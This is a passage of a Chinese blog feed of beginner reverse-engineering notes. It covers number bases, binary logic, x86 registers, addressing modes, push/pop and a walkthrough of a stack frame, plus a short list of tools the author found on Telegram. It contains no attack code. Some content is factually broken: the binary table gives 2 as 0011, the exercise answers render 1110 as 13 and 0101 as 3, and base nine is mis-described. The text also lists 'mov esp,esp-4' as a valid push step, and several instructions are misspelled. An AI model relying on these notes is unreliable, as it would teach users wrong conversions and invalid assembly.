位0111<br>8的二进制位1000 ，后续到F位1111</p><p><img src="https://i.imgur.com/4eVvOnf.gif"></p><h3 id="常用计量单位"><a href="#常用计量单位" class="headerlink" title="常用计量单位"></a>常用计量单位</h3><p>BYTE  字节  8BIT</p><table><thead><tr><th>BYTE</th><th>字节</th><th>8BIT</th><th>最小数据单位</th></tr></thead><tbody><tr><td>WORD</td><td>字</td><td>16BIT</td><td>2字节</td></tr><tr><td>DWORD</td><td>双字</td><td>32BIT</td><td>4字节</td></tr></tbody></table><h2 id="二进制的逻辑运算"><a href="#二进制的逻辑运算" class="headerlink" title="二进制的逻辑运算"></a>二进制的逻辑运算</h2><h3 id="1-或运算-or"><a href="#1-或运算-or" class="headerlink" title="1. 或运算(or,|)"></a>1. 或运算(or,<code>|</code>)</h3><p>汇编符号：or </p><p>C语言符号： <code>|</code></p><p>只要有一个为1则结果为1</p><p><img src="https://i.imgur.com/GENTFdK.png"></p><h3 id="2-与运算-and"><a href="#2-与运算-and" class="headerlink" title="2. 与运算(and,&amp;)"></a>2. 与运算(and,<code>&amp;</code>)</h3><p>汇编语言：and</p><p>C语言符号<code>&amp;</code></p><p>两个结果都是1则运算结果为1</p><p><img src="https://i.imgur.com/0MdS72K.png"></p><h3 id="异或运算-xor"><a href="#异或运算-xor" class="headerlink" title="异或运算(xor,^)"></a>异或运算(xor,<code>^</code>)</h3><p>汇编语言：xor </p><p>C语言符号：<code>^</code></p><p>两个结果不一样则运算结果为1</p><p><img src="https://i.imgur.com/prg4J3v.png"></p><h3 id="非运算-not"><a href="#非运算-not" class="headerlink" title="非运算(not,!)"></a>非运算(not,<code>!</code>)</h3><p>汇编语言：not </p><p>C语言符号：<code>!</code></p><p>1就是0，0就是1</p><p><img src="https://i.imgur.com/GFUUq4h.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据宽度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TG上看到的一些网页</title>
      <link href="/2024/10/24/%E5%85%B4%E8%B6%A3%E7%BD%91%E9%A1%B5/"/>
      <url>/2024/10/24/%E5%85%B4%E8%B6%A3%E7%BD%91%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>一些从TG上看到的觉得可以逝世的网页</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h2 id="CS-Notes"><a href="#CS-Notes" class="headerlink" title="CS-Notes"></a>CS-Notes</h2><h3 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h3><p><img src="https://i.imgur.com/jEXtU3z.png"></p><p>🗣CS-Notes：技术面试必备的计算机科学知识库，汇集了大量计算机科学领域的基础知识</p><p>👉链接：<a href="https://github.com/CyC2018/CS-Notes">CyC2018&#x2F;CS-Notes: :books: 技术面试必备基础知识、Leetcode、计算机操作系统、计算机网络、系统设计</a></p><h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><p>或许可以当作闲暇的阅读？嗯。。感觉不咋能看进去，不过逝世也没啥</p><h2 id="learn-regex"><a href="#learn-regex" class="headerlink" title="learn-regex"></a>learn-regex</h2><h3 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h3><p><img src="https://i.imgur.com/kOuvMRX.png"><br>🆔  网站名称：learn-regex</p><p>⭐  网站功能：正则表达式学习</p><p>📁  网站简介：一个学习正则表达式的网页，可以轻松掌握正则表达式的基本概念和应用。</p><p>提供了详细的教程和示例，涵盖了正则表达式的基本匹配、元字符、重复次数、锚点、标志等内容，适合初学者和有一定基础的用户。</p><p>🔗 网站链接：点击打开 (<a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md">https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md</a>)</p><h3 id="想法-1"><a href="#想法-1" class="headerlink" title="想法"></a>想法</h3><p>嗯。。感觉可以试着学习一下，或者了解一下。不求能手写正则罢，只试着达到可以看懂的地步。</p><h2 id="Awesome-Self-Hosted"><a href="#Awesome-Self-Hosted" class="headerlink" title="Awesome Self-Hosted"></a>Awesome Self-Hosted</h2><h3 id="信息-2"><a href="#信息-2" class="headerlink" title="信息"></a>信息</h3><p><img src="https://i.imgur.com/cap3vkA.png"></p><p>🆔  网站名称：Awesome Self-Hosted</p><p>⭐  网站功能：自托管项目列表</p><p>📁  网站简介：一款整理了可以在自己服务器上托管的各种开源软件和网络应用的网站。</p><p>可以通过该网站找到多种类型的自托管解决方案，包括内容管理系统、电子商务平台、文件共享工具、社交网络、分析工具等。</p><p>提供详细的项目描述、源代码链接和演示。</p><p>🔗 网站链接：点击打开 (<a href="https://awesome-selfhosted.net/">https://awesome-selfhosted.net/</a>)</p><h3 id="想法-2"><a href="#想法-2" class="headerlink" title="想法"></a>想法</h3><p>直觉告诉咱，没准儿以后用得上？</p><h2 id="谷歌插件-WebChat"><a href="#谷歌插件-WebChat" class="headerlink" title="谷歌插件-WebChat"></a>谷歌插件-WebChat</h2><h3 id="信息-3"><a href="#信息-3" class="headerlink" title="信息"></a>信息</h3><p><img src="https://i.imgur.com/bu6ZUuG.png"></p><p>WebChat：在任何网站上实现匿名安全聊天的浏览器扩展，利用WebRTC实现端到端加密通信，不依赖中央服务器，所有数据本地存储，确保了聊天的隐私性和安全性</p><p>👉链接：<a href="https://github.com/molvqingtai/WebChat/releases/tag/v1.3.1">Release v1.3.1 · molvqingtai&#x2F;WebChat</a></p><h3 id="想法-3"><a href="#想法-3" class="headerlink" title="想法"></a>想法</h3><p>没准儿可以逝世看</p><h2 id="浏览器插件-SingleFile"><a href="#浏览器插件-SingleFile" class="headerlink" title="浏览器插件-SingleFile"></a>浏览器插件-SingleFile</h2><h3 id="信息-4"><a href="#信息-4" class="headerlink" title="信息"></a>信息</h3><p><img src="https://i.imgur.com/VbPdcXF.png"></p><p>🗣SingleFile：一键将网页保存为单一HTML文件的浏览器扩展，支持标注网页后再导出、保存部分网页内容、批量保存等多个实用功能</p><h3 id="想法-4"><a href="#想法-4" class="headerlink" title="想法"></a>想法</h3><p>嗯。挺好用的还。</p><p>网页元素保存的很完整。</p>]]></content>
      
      
      <categories>
          
          <category> 范式阅读 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进制</title>
      <link href="/2024/10/23/%E8%BF%9B%E5%88%B6/"/>
      <url>/2024/10/23/%E8%BF%9B%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>学习进制相关的基本知识</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="关于进制"><a href="#关于进制" class="headerlink" title="关于进制"></a>关于进制</h1><h3 id="代入问题："><a href="#代入问题：" class="headerlink" title="代入问题："></a>代入问题：</h3><ol><li>为什么会有数字？我们生活中常用的数字是几进制？为什么要学习进制</li><li>进制的定义</li></ol><ul><li>十进制：十个符号组成，0 1 2 3 4 5 6 7 8 9 逢十进一。</li><li>九进制：九个符号组成，0 2 3 4 5 6 7 8 逢八进一，八个符号可随意定义。</li><li>N进制：N个符号组成，随意定义</li></ul><h3 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h3><p>二进制和十六进制的对照：</p><table><thead><tr><th>十进制数</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th><th>12</th><th>13</th><th>14</th><th>15</th></tr></thead><tbody><tr><td>二进制数</td><td>0000</td><td>0001</td><td>0011</td><td>0011</td><td>0100</td><td>0101</td><td>0110</td><td>0111</td><td>1000</td><td>1001</td><td>1010</td><td>1011</td><td>1100</td><td>1101</td><td>1110</td><td>1111</td></tr><tr><td>十六进制</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td></tr></tbody></table><p>八进制</p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr></thead><tbody><tr><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td><td>17</td></tr><tr><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td><td>25</td><td>26</td><td>27</td></tr><tr><td>30</td><td>31</td><td>32</td><td>33</td><td>34</td><td>35</td><td>36</td><td>37</td></tr><tr><td>40</td><td>41</td><td>42</td><td>43</td><td>44</td><td>45</td><td>46</td><td>47</td></tr><tr><td>50</td><td>51</td><td>52</td><td>53</td><td>54</td><td>55</td><td>56</td><td>57</td></tr><tr><td>60</td><td>61</td><td>62</td><td>63</td><td>64</td><td>65</td><td>66</td><td>67</td></tr><tr><td>70</td><td>71</td><td>72</td><td>73</td><td>74</td><td>75</td><td>76</td><td>77</td></tr><tr><td>100</td><td>101</td><td>102</td><td>103</td><td>104</td><td>105</td><td>106</td><td>107</td></tr><tr><td>110</td><td>111</td><td>112</td><td>113</td><td>114</td><td>115</td><td>116</td><td>117</td></tr></tbody></table><blockquote><p>[!NOTE] 注意<br>进制的本质是符号逢十进一的规则，这十个符号可以可以任意设定。以此可以达到加密的目的</p></blockquote><h2 id="计算机与数字的关系"><a href="#计算机与数字的关系" class="headerlink" title="计算机与数字的关系"></a>计算机与数字的关系</h2><p>(1).计算机的任何信息最终都是以二进制方式存储的<br>(2). 采用二进制存储的主要原因</p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><ol><li><p>2+3&#x3D;1成立么？说明理由。</p></li><li><p>将下面二进制数用16进制表示</p></li></ol><table><thead><tr><th>1100</th><th>1011</th><th>0101</th><th>0100</th><th>1110</th><th>1011</th><th>0101</th><th>0111</th><th>1011</th><th>0100</th><th>1010</th><th>1011</th></tr></thead><tbody><tr><td>C</td><td>B</td><td>5</td><td>4</td><td>13</td><td>B</td><td>3</td><td>7</td><td>B</td><td>4</td><td>A</td><td>B</td></tr></tbody></table><ol start="3"><li>将下面十六进制数用二进制表示<br>487FDC120ACE69B953FE</li></ol><h2 id="进制运算"><a href="#进制运算" class="headerlink" title="进制运算"></a>进制运算</h2><ol><li>十进制运算：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">7+9=16</span><br><span class="line"></span><br><span class="line">9-3=6</span><br><span class="line"></span><br><span class="line">2*3=6</span><br><span class="line"></span><br><span class="line">8/4=2</span><br></pre></td></tr></table></figure><ol start="2"><li>八进制</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2+3=?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2*3=?</span><br><span class="line"></span><br><span class="line">4+5=?</span><br><span class="line"></span><br><span class="line">4*5=?</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>1+1&#x3D;2</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>1+2&#x3D;3</td><td>2+2&#x3D;4</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1+3&#x3D;4</td><td>2+3&#x3D;5</td><td>3+3&#x3D;6</td><td></td><td></td><td></td><td></td></tr><tr><td>1+4&#x3D;5</td><td>2+4&#x3D;6</td><td>3+4&#x3D;7</td><td>4+4&#x3D;10</td><td></td><td></td><td></td></tr><tr><td>1+5&#x3D;6</td><td>2+5&#x3D;7</td><td>3+5&#x3D;10</td><td>4+5&#x3D;11</td><td>5+5&#x3D;12</td><td></td><td></td></tr><tr><td>1+6&#x3D;7</td><td>2+6&#x3D;10</td><td>3+6&#x3D;11</td><td>4+6&#x3D;12</td><td>5+6&#x3D;13</td><td>6+6&#x3D;14</td><td></td></tr><tr><td>1+7&#x3D;10</td><td>2+7&#x3D;11</td><td>3+7&#x3D;12</td><td>4+7&#x3D;13</td><td>5+7&#x3D;14</td><td>6+7&#x3D;15</td><td>7+7&#x3D;16</td></tr></tbody></table><table><thead><tr><th>1<code>*</code>1&#x3D;1</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>1<code>*</code>2&#x3D;2</td><td>2<code>*</code>2&#x3D;4</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1<code>*</code>3&#x3D;3</td><td>2<code>*</code>3&#x3D;6</td><td>3<code>*</code>3&#x3D;11</td><td></td><td></td><td></td><td></td></tr><tr><td>1<code>*</code>4&#x3D;4</td><td>2<code>*</code>4&#x3D;10</td><td>3<code>*</code>4&#x3D;14</td><td>4<code>*</code>4&#x3D;20</td><td></td><td></td><td></td></tr><tr><td>1<code>*</code>5&#x3D;5</td><td>2<code>*</code>5&#x3D;12</td><td>3<code>*</code>5&#x3D;17</td><td>4<code>*</code>5&#x3D;24</td><td>5<code>*</code>5&#x3D;31</td><td></td><td></td></tr><tr><td>1<code>*</code>6&#x3D;6</td><td>2<code>*</code>6&#x3D;14</td><td>3<code>*</code>6&#x3D;22</td><td>4<code>*</code>6&#x3D;30</td><td>5<code>*</code>6&#x3D;36</td><td>6<code>*</code>6&#x3D;44</td><td></td></tr><tr><td>1<code>*</code>7&#x3D;7</td><td>2<code>*</code>7&#x3D;16</td><td>3<code>*</code>7&#x3D;25</td><td>4<code>*</code>7&#x3D;34</td><td>5<code>*</code>7&#x3D;43</td><td>6<code>*</code>7&#x3D;52</td><td>7<code>*</code>7&#x3D;61</td></tr></tbody></table><p><img src="https://i.imgur.com/nXbT4Rx.png"><br>练习：</p><ol><li>编制7进制加法表，乘法表。并计算下面的结果：</li></ol><ul><li>23456+54356&#x3D;?</li><li>5621-654&#x3D;?</li><li>234<code>*</code>65&#x3D;?</li></ul><ol start="2"><li>编制16进制的加法表，乘法表，并计算下面的结果：</li></ol><ul><li>2D4E6+CF3A6&#x3D;?</li><li>5FD1-E5A&#x3D;?</li><li>2CA<code>*</code>A5&#x3D;?</li></ul><p><img src="https://i.imgur.com/wO1FoRO.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寄存器与汇编语言</title>
      <link href="/2024/10/20/%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
      <url>/2024/10/20/%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>关于寄存器和汇编语言指令的简单学习</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><p><img src="https://i.imgur.com/ea0VR8R.png"></p><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>首当其冲的是通用寄存器，这些的寄存器是程序执行代码最最常用，也最最基础的寄存器，程序执行过程中，绝大部分时间都是在操作这些寄存器来实现指令功能。</p><p>所谓通用，即这些寄存器CPU没有特殊的用途，交给应用程序“随意”使用。注意，这个随意，我打了引号，对于有些寄存器，CPU有一些潜规则，用的时候要注意。</p><blockquote><ul><li><strong>eax</strong>: 通常用来执行加法，函数调用的返回值一般也放在这里面</li><li><strong>ebx</strong>: 数据存取</li><li><strong>ecx</strong>: 通常用来作为计数器，比如for循环</li><li><strong>edx</strong>: 读写I&#x2F;O端口时，edx用来存放端口号</li><li><strong>esp</strong>: 栈顶指针，指向栈的顶部</li><li><strong>ebp</strong>: 栈底指针，指向栈的底部，通常用<code>ebp+偏移量</code>的形式来定位函数存放在栈中的局部变量</li><li><strong>esi</strong>: 字符串操作时，用于存放数据源的地址</li><li><strong>edi</strong>: 字符串操作时，用于存放目的地址的，和esi两个经常搭配一起使用，执行字符串的复制等操作</li></ul></blockquote><p>mov指令，将后面参数得值赋值给前面寄存器</p><p><img src="https://i.imgur.com/3hpIhst.gif"></p><p>add指令，将后面参数加到前面寄存器<br><img src="https://i.imgur.com/xHxBPxw.gif"></p><p>sub指令，以后面参数再寄存器减去</p><p><img src="https://i.imgur.com/PeU8KC0.gif"></p><h2 id="内存的读写"><a href="#内存的读写" class="headerlink" title="内存的读写"></a>内存的读写</h2><h3 id="寻址公式一：-立即数"><a href="#寻址公式一：-立即数" class="headerlink" title="寻址公式一：[立即数]"></a>寻址公式一：[立即数]</h3><p><strong>读取数据内存值</strong><br>MOV EAX,宽度 地址 DS(立即数)</p><p>MOV EAX,DWORD PTR DS:[0X13FFC4]</p><p>其他两种，<br>MOV EAX,DWORD PTR SS:[ESP或者EBP]<br>MOV EAX,DWORD PTR ES:[EDI]<br>此处主要讲立即数DS</p><p>示例：</p><p>MOV EAX,DWORD PTR DS:[12FFC4]<br>取右下角地址编号[12FFC4]位置的值赋值到寄存器EAX</p><p><img src="https://i.imgur.com/gUiLaNc.gif"></p><p><strong>向内存中写入数据：</strong></p><p>MOV DWORD PTR DS:[0X13FFC4],EAX<br>MOV DWORD PTR DS:[0X13FFC4],EAX</p><p>示例：</p><p>MOV DWORD PTR DS:[12FFC4],87654321<br>将87654321的值写入内存地址[12FFC4]指向的位置中</p><p><img src="https://i.imgur.com/tE6WShy.gif"></p><p><strong>获取内存编号：</strong></p><p>LEA EAX,DWORD PTR DS:[0X13FFC4]<br>LEA EAX,DWORD PTR DS:[ESP+8]</p><p>示例：</p><p>LEA ECX,DWORD PTR DS:[12FFC4]<br>取内存地址[12FFC4]存到ECX中<br><img src="https://i.imgur.com/ilmzO0H.gif"></p><h3 id="寻址公式二：-reg-reg代表任意八个通用寄存器中的任一个"><a href="#寻址公式二：-reg-reg代表任意八个通用寄存器中的任一个" class="headerlink" title="寻址公式二：[reg] reg代表任意八个通用寄存器中的任一个"></a>寻址公式二：[reg] reg代表任意八个通用寄存器中的任一个</h3><p>读取内存值：</p><p>MOV ECS,0x13FFD0<br>MOV EAX,DWORD PTR DS:[ECX]</p><p>向内存写入数据：</p><p>MOV EDX,0x13FFD8<br>MOV DWORD PTR DS:[EDS],0X87654321</p><p>获取内存编号:</p><p>LEA EAX,DWORD PTR DS:[EDX]<br>MOV EAX,DWORD PTR DS:[EDX]</p><h3 id="寻址公式三：-reg-立即数"><a href="#寻址公式三：-reg-立即数" class="headerlink" title="寻址公式三：[reg+立即数]"></a>寻址公式三：[reg+立即数]</h3><p>读取内存值：</p><p>MOV ECX,0X13FFD0<br>MOV EAX,DWORD PTR DS:[ECX+4]</p><p>向内存中写入数据：</p><p>MOV EDX,0x13FFD8<br>MOV DWORD PTR DS:[EDX+0xC],0X87654321</p><p>获取到内存编号：</p><p>LEA EAX,DWORD PTR DS:[EDX+4]<br>MOV EAX,DWORD PTR DS:[EDX+4]</p><h3 id="公式四-reg-reg-1-2-4-8"><a href="#公式四-reg-reg-1-2-4-8" class="headerlink" title="公式四:[reg+reg*{1,2,4,8}]"></a>公式四:[reg+reg*{1,2,4,8}]</h3><p>读取值：</p><p>MOV EAX,13FFC4<br>MOV ECX,2<br>MOV EDX,DWORD PTR DS:[EAX+ECX*4]</p><p>最后等价于将[EAX+8]赋值到EDX</p><p>后续写数据和获取编号类似用法</p><h3 id="寻址公式五-reg-reg-1-2-4-8-立即数"><a href="#寻址公式五-reg-reg-1-2-4-8-立即数" class="headerlink" title="寻址公式五:[reg+reg*[1,2,4,8]+立即数]"></a>寻址公式五:[reg+reg*[1,2,4,8]+立即数]</h3><p>读取值：</p><p>MOV EAX,13FFC4<br>MOV ECX,2<br>MOV EDX,DWORD PTR DS:[EAX+ECX*4+4]</p><p>结果相当于[EAX+8+4]赋值到EDX</p><p>后续差不多</p><h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><ol><li>本质是内存</li><li>主要存储临时变量</li><li>用于系统维护，主要对于开发人员是透明的</li></ol><p><img src="https://i.imgur.com/SvqeuvE.png"></p><p>示例：</p><p>PUSH 12345678（压值)向栈里存值，栈顶ESP减少4，栈底ESP不变，右下角可以看到增加了一个值</p><p><img src="https://i.imgur.com/IjX8lV9.gif"></p><p>PUSH EAX                 将EAX中的值放到栈里，ESP再减少4</p><p><img src="https://i.imgur.com/tGQp7Do.gif"></p><p>POP ECX             将栈顶ESP内存的值取出到ECX，ESP的值增加4</p><p><img src="https://i.imgur.com/pZW182x.gif"></p><p>POP EDX        将栈顶ESP去一个值，到EDX，ESP的值增加4</p><p><img src="https://i.imgur.com/HmSa6AT.gif"></p><h2 id="变形的艺术"><a href="#变形的艺术" class="headerlink" title="变形的艺术"></a>变形的艺术</h2><p>push eax 可以拆分为</p><ul><li>将esp的值减4（一种表述）：<ul><li>lea esp,dword ptr ss:[esp-4]</li></ul></li><li>将eax的值赋值到esp的内存中（三种表述）：<ul><li>mov dword ptr ss:[esp],eax</li><li>mov esp,esp-4 </li><li>sub esp,4<br>两个步骤顺序可以任意排列，表述也可以任意组合</li></ul></li></ul><p>以此类推，push eax有多种不同的变形方式或者说有多种方式可以达到push eax的效果</p><p>类似的，pop ecx 代码可以拆分为 </p><ul><li>将esp地址的值赋值到ecx：<ul><li>mov ecx,dword ptr ss:[esp]</li></ul></li><li>将esp的值加上4:<ul><li>lea esp,dword ptr ss:[esp+4]</li><li>mov esp,esp+4</li><li>add esp,4</li></ul></li></ul><blockquote><p>[!NOTE] 练习<br>push esp   会如何拆分，如何变形</p></blockquote><p>STPS 指令的作用是将EAX中的值拷贝到EDI指向的地址：</p><p>MOV EAX,12345678<br>LEA EDI,DWORD PTR SS[ESP]<br>STOS DWORD PTR ES:[EDI]</p><p>这段代码大致就是<br>首先将12345678的赋值到EAX寄存器中，然后将ESP的内存地址取到LEA中<br>再用STOS将EAX的值拷贝到EDId的内存地址(第二步中获取到的ESP的地址)所指向的值</p><p>REP指令的目的是重复，而ECX的值为重复的次数</p><p>MOV EAX,0x22222222<br>MOV ECX,2<br>LEA EDI,DWORD PTR SS:[ESP]<br>REP STOS DWORD PTR ES:[EDI]</p><p>大致就是<br>首先将22222222赋值给了EAX，然赋值ECX&#x3D;2，确定循环的次数为2<br>再就是将ESP的地址赋值到EDI<br>最后循环两次，以此将EAX的值丢给EDI，之后EDI自己增加4<br>再将EAX的值丢给[EDI+4],之后EDI再自己+4</p><blockquote><p>[!NOTE] 练习<br>PUSH EBP<br>MOV EBP<br>SUB ESP,40<br>PUSH EBX<br>PUSH ESI<br>PUS EDI<br>LEA EDI,DWORD PTR SS:[EBP-40]<br>MOV ECX,10<br>MOV ECX,10<br>MOV EAX,CCCCCCCC<br>REP STOS DWORD PTR ES:[EDI]<br>MOV EAX,DWORD PTR SS:[EBP+8]<br>ADD EAX,DWORD PTR SS:[EBP+C]<br>POP EDI<br>POP ESI<br>POP EBX<br>MOV ESP,EBP<br>POP EBP<br>RETN</p><p>Contents</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寄存器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆栈图</title>
      <link href="/2024/10/20/%E5%A0%86%E6%A0%88%E5%9B%BE/"/>
      <url>/2024/10/20/%E5%A0%86%E6%A0%88%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>学习如何系统的绘画堆栈图</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><p>程序源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> z=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> x+y+z;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> r=Plus(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="初始位置"><a href="#初始位置" class="headerlink" title="初始位置"></a>初始位置</h2><p><img src="https://i.imgur.com/y7GT64i.png"></p><p>以此为初始位置画堆栈图，注意这里设定每个格子是四个字节<br><img src="https://i.imgur.com/IyaRMTd.png"></p><h2 id="PUSH-4"><a href="#PUSH-4" class="headerlink" title="PUSH 4"></a>PUSH 4</h2><p><img src="/../img/%E5%8A%A8%E7%94%BB26.gif"></p><p><img src="https://i.imgur.com/q7J60Io.png"></p><h2 id="PUSH-3"><a href="#PUSH-3" class="headerlink" title="PUSH 3"></a>PUSH 3</h2><p><img src="https://i.imgur.com/w42nidW.gif"></p><p><img src="https://i.imgur.com/pJTpzIR.png"></p><p>省略中间过程，合并<code>push 4</code>和<code>push 3</code>指令的过程</p><h2 id="CALL-00401005"><a href="#CALL-00401005" class="headerlink" title="CALL 00401005"></a>CALL 00401005</h2><ol><li>将EIP地址修改为后面的函数地址</li><li>将返回地址压入堆栈保存起来</li></ol><p>此处按F7步进到函数<br><img src="https://i.imgur.com/0g7bFGx.gif"></p><p>右下角的数值压入00401081<br><img src="https://i.imgur.com/xM1WvLl.png"></p><p><img src="https://i.imgur.com/Wc3492y.png"></p><p>返回地址00401081的计算是以字节计算的，<br><img src="https://i.imgur.com/FrpcN93.png"><br>两个字作为一个字节，以此类推，这里E8 84 FF FF FF,一起五个字节，则记作返回地址为0040107C+5，得到数值00401081</p><h2 id="JMP-00501020"><a href="#JMP-00501020" class="headerlink" title="JMP 00501020"></a>JMP 00501020</h2><p>单纯的跳板，跳转到函数的真正位置00401020</p><p><img src="https://i.imgur.com/SjSDKdm.gif"></p><p><img src="https://i.imgur.com/OVRKtJX.png"></p><h2 id="PUSH-EBP"><a href="#PUSH-EBP" class="headerlink" title="PUSH EBP"></a>PUSH EBP</h2><p>这里将栈底EBP的值压入堆栈进行保存</p><p><img src="https://i.imgur.com/x8MfF8m.gif"></p><p><img src="https://i.imgur.com/on6CJMe.png"></p><p>这里另起一行进行堆栈图绘制</p><h2 id="MOV-EBP-ESP"><a href="#MOV-EBP-ESP" class="headerlink" title="MOV EBP,ESP"></a>MOV EBP,ESP</h2><p>将栈顶ESP的值赋值拷贝给栈底EBP</p><p><img src="https://i.imgur.com/JANiLR5.gif"></p><p><img src="https://i.imgur.com/MHeljoi.png"></p><h2 id="SUB-ESP-44"><a href="#SUB-ESP-44" class="headerlink" title="SUB ESP,44"></a>SUB ESP,44</h2><p>提升堆栈，为子程序腾出空间</p><p><img src="https://i.imgur.com/JENaJcq.gif"></p><p>汇编中都是16进制的数值，所以44这里需要换算</p><p><img src="https://i.imgur.com/ATIVqyH.gif"></p><p>十进制数为17，所以就堆栈图需要esp上移动17格，从右下角也能看出上移了17位<br><img src="https://i.imgur.com/9mlqzLH.png"></p><blockquote><p>[!NOTE] 计算器注解<br><strong>HEX，Hexadecimal ，十六进制。</strong> <br><strong>DEC，Decimal ，十进制。</strong> <br><strong>OCT，Octal ，八进制。</strong><br> <strong>BIN，Binary ，二进制</strong></p></blockquote><p><img src="https://i.imgur.com/GUKBrtJ.png"></p><p>新增加的这一段也被称为缓冲区，与常听说的缓冲区溢出有关</p><h2 id="指令集1"><a href="#指令集1" class="headerlink" title="指令集1"></a>指令集1</h2><h3 id="PUSH-EBX"><a href="#PUSH-EBX" class="headerlink" title="PUSH EBX"></a>PUSH EBX</h3><h3 id="PUSH-ESI"><a href="#PUSH-ESI" class="headerlink" title="PUSH ESI"></a>PUSH ESI</h3><h3 id="PUSH-EDI"><a href="#PUSH-EDI" class="headerlink" title="PUSH EDI"></a>PUSH EDI</h3><p>由于命令一样，所以合在一起</p><p>push ebx<br><img src="https://i.imgur.com/Sh2eIg9.gif"></p><p>后续两个，push esi 和push edi<br><img src="https://i.imgur.com/PwVx6u0.gif"></p><p><img src="https://i.imgur.com/hJbbdEJ.png"></p><h2 id="指令集-2"><a href="#指令集-2" class="headerlink" title="指令集-2"></a>指令集-2</h2><p>填充缓冲区</p><h3 id="LEA-EDI-DWORD-PTR-SS-EBP-44"><a href="#LEA-EDI-DWORD-PTR-SS-EBP-44" class="headerlink" title="LEA EDI,DWORD PTR SS:[EBP-44]"></a>LEA EDI,DWORD PTR SS:[EBP-44]</h3><ul><li>将[EBP-44]的地址拷贝到EDI</li></ul><h3 id="MOV-ECX-11"><a href="#MOV-ECX-11" class="headerlink" title="MOV ECX,11"></a>MOV ECX,11</h3><ul><li>赋值ECX为11,作为REP循环的次数</li></ul><h3 id="MOV-EAX-CCCCCCCC"><a href="#MOV-EAX-CCCCCCCC" class="headerlink" title="MOV EAX,CCCCCCCC"></a>MOV 